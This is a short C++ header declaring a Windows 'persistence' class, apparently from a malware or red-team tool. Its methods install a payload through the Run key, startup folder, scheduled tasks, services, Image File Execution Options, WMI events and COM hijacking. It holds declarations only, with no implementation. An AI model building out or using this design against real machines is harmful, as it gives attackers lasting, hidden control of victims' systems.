#pragma once
#include <Windows.h>
#include <string>
class persistence {
public:
    bool runkey(std::wstring payload);
    bool startupfolder(std::wstring payload);
    bool scheduledtask(std::wstring payload);
    bool serviceinstall(std::wstring payload);
    bool imagefileexec(std::wstring target, std::wstring payload);
    bool wmievent(std::wstring payload);
    bool comhijack(std::wstring clsid, std::wstring payload);
    bool multiple(std::wstring payload);
    bool cleanup();
};